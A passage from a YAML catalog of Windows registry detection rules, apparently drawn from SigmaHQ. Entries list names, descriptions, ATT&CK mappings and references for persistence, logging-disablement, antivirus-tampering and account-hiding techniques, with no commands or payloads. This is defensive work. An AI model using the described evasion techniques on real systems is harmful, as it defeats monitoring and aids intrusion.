  - https://trustedsec.com/blog/specula-turning-outlook-into-a-c2-with-one-registry-change
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0cf2e1c6-8d10-4273-8059-738778f981ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_reflectdebugger.yml
  name: Potential WerFault ReflectDebugger Registry Value Abuse
  description: Detects potential WerFault "ReflectDebugger" registry value abuse for
    persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html
  - https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fe20dda1-6f37-4379-bbe0-a98d400cae90
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_scrobj_dll.yml
  name: Potential Persistence Via Scrobj.dll COM Hijacking
  description: Detect use of scrobj.dll as this DLL looks for the ScriptletURL key
    to get the location of the script to execute
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1546.015/T1546.015.md
  false_positives:
  - Legitimate use of the dll.
  notes: ''
- detection_id: dfb5b4e8-91d0-4291-b40a-e3b0d3942c45
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_shim_database.yml
  name: Potential Persistence Via Shim Database Modification
  description: 'Adversaries may establish persistence and/or elevate privileges by
    executing malicious content triggered by application shims.

    The Microsoft Windows Application Compatibility Infrastructure/Framework (Application
    Shim) was created to allow for backward compatibility of software as the operating
    system codebase changes over time

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.011
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.011
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.011/T1546.011.md#atomic-test-3---registry-key-creation-andor-modification-events-for-sdb
  - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
  - https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/
  false_positives:
  - Legitimate custom SHIM installations will also trigger this rule
  notes: ''
- detection_id: bf344fea-d947-4ef4-9192-34d008315d3a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_shim_database_susp_application.yml
  name: Suspicious Shim Database Patching Activity
  description: Detects installation of new shim databases that try to patch sections
    of known processes for potential process injection or persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.011
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.011
  time_window: ''
  references:
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/pillowmint-fin7s-monkey-thief/
  - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6b6976a3-b0e6-4723-ac24-ae38a737af41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_shim_database_uncommon_location.yml
  name: Potential Persistence Via Shim Database In Uncommon Location
  description: Detects the installation of a new shim database where the file is located
    in a non-default location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.011
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.011
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
  - https://andreafortuna.org/2018/11/12/process-injection-and-persistence-using-application-shimming/
  - https://www.blackhat.com/docs/asia-14/materials/Erickson/Asia-14-Erickson-Persist-It-Using-And-Abusing-Microsofts-Fix-It-Patches.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 086ae989-9ca6-4fe7-895a-759c5544f247
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_typed_paths.yml
  name: Potential Persistence Via TypedPaths
  description: Detects modification addition to the 'TypedPaths' key in the user or
    admin registry from a non standard application. Which might indicate persistence
    attempt
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://twitter.com/dez_/status/1560101453150257154
  - https://forensafe.com/blogs/typedpaths.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 961e33d1-4f86-4fcf-80ab-930a708b2f82
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_persistence_xll.yml
  name: Potential Persistence Via Excel Add-in - Registry
  description: Detect potential persistence via the creation of an excel add-in (XLL)
    file to make it run automatically when Excel is started.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137.006
  tags:
  - attack.persistence
  - attack.t1137.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md
  - https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence
  false_positives:
  - Unknown
  notes: ''
- detection_id: a9b6c011-ab69-4ddb-bc0a-c4f21c80ec47
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_policies_associations_tamper.yml
  name: Potential Attachment Manager Settings Associations Tamper
  description: Detects tampering with attachment manager settings policies associations
    to lower the default file type risks (See reference for more information)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/topic/information-about-the-attachment-manager-in-microsoft-windows-c48a4dcd-8de5-2af5-ee9b-cd795ae42738
  - https://www.virustotal.com/gui/file/2bcd5702a7565952c44075ac6fb946c7780526640d1264f692c7664c02c68465
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ee77a5db-b0f3-4be2-bfd4-b58be1c6b15a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_policies_attachments_tamper.yml
  name: Potential Attachment Manager Settings Attachments Tamper
  description: Detects tampering with attachment manager settings policies attachments
    (See reference for more information)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/topic/information-about-the-attachment-manager-in-microsoft-windows-c48a4dcd-8de5-2af5-ee9b-cd795ae42738
  - https://www.virustotal.com/gui/file/2bcd5702a7565952c44075ac6fb946c7780526640d1264f692c7664c02c68465
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f5fe36cf-f1ec-4c23-903d-09a3110f6bbb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_potential_clickfix_execution.yml
  name: Potential ClickFix Execution Pattern - Registry
  description: 'Detects potential ClickFix malware execution patterns by monitoring
    registry modifications in RunMRU keys containing HTTP/HTTPS links.

    ClickFix is known to be distributed through phishing campaigns and uses techniques
    like clipboard hijacking and fake CAPTCHA pages.

    Through the fakecaptcha pages, the adversary tricks users into opening the Run
    dialog box and pasting clipboard-hijacked content,

    such as one-liners that execute remotely hosted malicious files or scripts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.001
  tags:
  - attack.execution
  - attack.t1204.001
  time_window: ''
  references:
  - https://github.com/JohnHammond/recaptcha-phish
  - https://www.zscaler.com/blogs/security-research/deepseek-lure-using-captchas-spread-malware
  - https://www.threatdown.com/blog/clipboard-hijacker-tries-to-install-a-trojan/
  - https://app.any.run/tasks/5c16b4db-4b36-4039-a0ed-9b09abff8be2
  - https://www.esentire.com/security-advisories/netsupport-rat-clickfix-distribution
  - https://medium.com/@boutnaru/the-windows-foreniscs-journey-run-mru-run-dialog-box-most-recently-used-57375a02d724
  - https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/
  - https://medium.com/@poudelswachchhanda123/preventing-lnk-and-fakecaptcha-threats-a-system-hardening-approach-2f7b7ed2e493
  - https://www.scpx.com.au/2025/11/16/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/
  false_positives:
  - Legitimate applications using RunMRU with HTTP links
  notes: ''
- detection_id: 4a5f5a5e-ac01-474b-9b4e-d61298c9df1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml
  name: PowerShell as a Service in Registry
  description: Detects that a powershell code is written to the registry as a service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8218c875-90b9-42e2-b60d-0b0069816d10
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_powershell_enablescripts_enabled.yml
  name: PowerShell Script Execution Policy Enabled
  description: Detects the enabling of the PowerShell script execution policy. Once
    enabled, this policy allows scripts to be executed.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableScripts
  false_positives:
  - Likely
  notes: ''
- detection_id: fad91067-08c5-4d1a-8d8c-d96a21b37814
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_powershell_execution_policy.yml
  name: Potential PowerShell Execution Policy Tampering
  description: Detects changes to the PowerShell execution policy in order to bypass
    signing requirements for script execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.3
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8d85cf08-bf97-4260-ba49-986a2a65129c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_powershell_in_run_keys.yml
  name: Suspicious PowerShell In Registry Run Keys
  description: Detects potential PowerShell commands or code within registry run keys
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/frack113/atomic-red-team/blob/a9051c38de8a5320b31c7039efcbd3b56cf2d65a/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry
  - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Legitimate admin or third party scripts. Baseline according to your environment
  notes: ''
- detection_id: fecfd1a1-cc78-4313-a1ea-2ee2e8ec27a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_powershell_logging_disabled.yml
  name: PowerShell Logging Disabled Via Registry Key Tampering
  description: Detects changes to the registry for the currently logged-in user. In
    order to disable PowerShell module logging, script block logging or transcription
    and script execution logging
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  - attack.t1112
  - attack.persistence
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-32---windows-powershell-logging-disabled
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7021255e-5db3-4946-a8b9-0ba7a4644a69
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_provisioning_command_abuse.yml
  name: Potential Provisioning Registry Key Abuse For Binary Proxy Execution - REG
  description: Detects potential abuse of the provisioning registry key for indirect
    command execution through "Provlaunch.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
  - https://twitter.com/0gtweet/status/1674399582162153472
  false_positives:
  - Unknown
  notes: ''
- detection_id: 25ffa65d-76d8-4da5-a832-3f2b0136e133
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_pua_sysinternals_execution_via_eula.yml
  name: PUA - Sysinternal Tool Execution - Registry
  description: Detects the execution of a Sysinternals Tool via the creation of the
    "accepteula" registry key
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1588.002
  tags:
  - attack.resource-development
  - attack.t1588.002
  time_window: ''
  references:
  - https://twitter.com/Moti_B/status/1008587936735035392
  false_positives:
  - Legitimate use of SysInternals tools
  - Programs that use the same Registry Key
  notes: ''
- detection_id: f50f3c09-557d-492d-81db-9064a8d4e211
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_pua_sysinternals_renamed_execution_via_eula.yml
  name: Suspicious Execution Of Renamed Sysinternals Tools - Registry
  description: Detects the creation of the "accepteula" key related to the Sysinternals
    tools being created from executables with the wrong name (e.g. a renamed Sysinternals
    tool)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1588.002
  tags:
  - attack.resource-development
  - attack.t1588.002
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c7da8edc-49ae-45a2-9e61-9fd860e4e73d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_pua_sysinternals_susp_execution_via_eula.yml
  name: PUA - Sysinternals Tools Execution - Registry
  description: Detects the execution of some potentially unwanted tools such as PsExec,
    Procdump, etc. (part of the Sysinternals suite) via the creation of the "accepteula"
    registry key.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1588.002
  tags:
  - attack.resource-development
  - attack.t1588.002
  time_window: ''
  references:
  - https://twitter.com/Moti_B/status/1008587936735035392
  false_positives:
  - Legitimate use of SysInternals tools. Filter the legitimate paths used in your
    environment
  notes: ''
- detection_id: 8023f872-3f1d-4301-a384-801889917ab4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_renamed_sysinternals_eula_accepted.yml
  name: Usage of Renamed Sysinternals Tools - RegistrySet
  description: Detects non-sysinternals tools setting the "accepteula" key which normally
    is set on sysinternals tool execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1588.002
  tags:
  - attack.resource-development
  - attack.t1588.002
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 90f342e1-1aaa-4e43-b092-39fda57ed11e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_rpcrt4_etw_tamper.yml
  name: ETW Logging Disabled For rpcrt4.dll
  description: Detects changes to the "ExtErrorInformation" key in order to disable
    ETW logging for rpcrt4.dll
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - attack.t1562
  time_window: ''
  references:
  - http://redplait.blogspot.com/2020/07/whats-wrong-with-etw.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: a7df0e9e-91a5-459a-a003-4cde67c2ff5d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_runmru_susp_command_execution.yml
  name: Potentially Suspicious Command Executed Via Run Dialog Box - Registry
  description: 'Detects execution of commands via the run dialog box on Windows by
    checking values of the "RunMRU" registry key.

    This technique was seen being abused by threat actors to deceive users into pasting
    and executing malicious commands, often disguised as CAPTCHA verification steps.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf
  - https://medium.com/@shaherzakaria8/downloading-trojan-lumma-infostealer-through-capatcha-1f25255a0e71
  - https://www.forensafe.com/blogs/runmrukey.html
  - https://redcanary.com/blog/threat-intelligence/intelligence-insights-october-2024/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 40b6e656-4e11-4c0c-8772-c1cc6dae34ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml
  name: ScreenSaver Registry Key Set
  description: Detects registry key established after masqueraded .scr file execution
    using Rundll32 through desk.cpl
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://twitter.com/VakninHai/status/1517027824984547329
  - https://twitter.com/pabraeken/status/998627081360695297
  - https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files
  false_positives:
  - Legitimate use of screen saver
  notes: ''
- detection_id: 6c304b02-06e6-402d-8be4-d5833cdf8198
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_sentinelone_shell_context_tampering.yml
  name: Potential SentinelOne Shell Context Menu Scan Command Tampering
  description: Detects potentially suspicious changes to the SentinelOne context menu
    scan command by a process other than SentinelOne.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://mrd0x.com/sentinelone-persistence-via-menu-context/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 612e47e9-8a59-43a6-b404-f48683f45bd6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_servicedll_hijack.yml
  name: ServiceDll Hijack
  description: 'Detects changes to the "ServiceDLL" value related to a service in
    the registry.

    This is often used as a method of persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time
  - https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/
  false_positives:
  - Administrative scripts
  - Installation of a service
  notes: ''
- detection_id: 4f281b83-0200-4b34-bf35-d24687ea57c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_services_etw_tamper.yml
  name: ETW Logging Disabled For SCM
  description: Detects changes to the "TracingDisabled" key in order to disable ETW
    logging for services.exe (SCM)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - attack.t1562
  time_window: ''
  references:
  - http://redplait.blogspot.com/2020/07/whats-wrong-with-etw.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1c3121ed-041b-4d97-a075-07f54f20fb4a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_set_nopolicies_user.yml
  name: Registry Explorer Policy Modification
  description: Detects registry modifications that disable internal tools or functions
    in explorer (malware like Agent Tesla uses this technique)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md
  false_positives:
  - Legitimate admin script
  notes: ''
- detection_id: 5a2b21ee-6aaa-4234-ac9d-59a59edf90a1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_sip_persistence.yml
  name: Persistence Via New SIP Provider
  description: Detects when an attacker register a new SIP provider for persistence
    and defense evasion
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1553.003
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1553.003
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/codesigning.html
  - https://github.com/gtworek/PSBits/tree/master/SIP
  - https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf
  false_positives:
  - Legitimate SIP being registered by the OS or different software.
  notes: ''
- detection_id: 9f4662ac-17ca-43aa-8f12-5d7b989d0101
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_sophos_av_tamper.yml
  name: Tamper With Sophos AV Registry Keys
  description: Detects tamper attempts to sophos av functionality via registry key
    modification
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/
  false_positives:
  - Some FP may occur when the feature is disabled by the AV itself, you should always
    investigate if the action was legitimate
  notes: ''
- detection_id: f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_special_accounts.yml
  name: Hiding User Account Via SpecialAccounts Registry Key
  description: Detects modifications to the registry key "HKLM\Software\Microsoft\Windows
    NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where the value is set to
    "0" in order to hide user account from being listed on the logon screen.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1564.002
  tags:
  - attack.defense-evasion
  - attack.t1564.002
  time_window: ''
  references:
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1564.002/T1564.002.md#atomic-test-3---create-hidden-user-in-registry
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0c93308a-3f1b-40a9-b649-57ea1a1c1d63
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_suppress_defender_notifications.yml
  name: Activate Suppression of Windows Security Center Notifications
  description: Detect set Notification_Suppress to 1 to disable the Windows security
    center notification
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 34aa0252-6039-40ff-951f-939fd6ce47d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_susp_keyboard_layout_load.yml
  name: Suspicious Keyboard Layout Load
  description: Detects the keyboard preload installation with a suspicious keyboard
    layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems
    maintained by US staff only
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
